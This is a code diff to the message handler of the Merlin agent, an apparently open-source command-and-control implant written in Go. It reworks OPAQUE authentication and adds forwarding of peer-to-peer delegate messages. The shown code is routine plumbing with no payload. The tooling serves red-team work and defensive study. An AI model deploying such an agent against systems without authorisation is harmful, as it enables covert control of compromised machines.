@@ -24,10 +24,10 @@ import (
 	// Merlin Main
 	"github.com/Ne0nd0g/merlin/pkg/jobs"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
-	"github.com/Ne0nd0g/merlin/pkg/opaque"
 
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
+	"github.com/Ne0nd0g/merlin-agent/p2p"
 )
 
 // messageHandler processes an input message from the server and adds it to the job channel for processing by the agent
@@ -46,20 +46,15 @@ func (a *Agent) messageHandler(m messages.Base) {
 	case messages.IDLE:
 		cli.Message(cli.NOTE, "Received idle command, doing nothing")
 	case messages.OPAQUE:
-		if m.Payload.(opaque.Opaque).Type == opaque.ReAuthenticate {
-			cli.Message(cli.NOTE, "Received re-authentication request")
-			// Re-authenticate, but do not re-register
-			msg, err := a.Client.Auth("opaque", false)
-			if err != nil {
-				a.FailedCheckin++
-				result.Stderr = err.Error()
-				jobsOut <- jobs.Job{
-					AgentID: a.ID,
-					Type:    jobs.RESULT,
-					Payload: result,
-				}
+		err := a.Client.Authenticate(m)
+		if err != nil {
+			a.FailedCheckin++
+			result.Stderr = err.Error()
+			jobsOut <- jobs.Job{
+				AgentID: a.ID,
+				Type:    jobs.RESULT,
+				Payload: result,
 			}
-			a.messageHandler(msg)
 		}
 	default:
 		result.Stderr = fmt.Sprintf("%s is not a valid message type", messages.String(m.Type))
@@ -69,5 +64,11 @@ func (a *Agent) messageHandler(m messages.Base) {
 			Payload: result,
 		}
 	}
+
+	// If there are any Delegate messages, send them to the Handler
+	if len(m.Delegates) > 0 {
+		p2p.HandleDelegateMessages(m.Delegates)
+	}
+
 	cli.Message(cli.DEBUG, "Leaving agent.messageHandler function without error")
 }
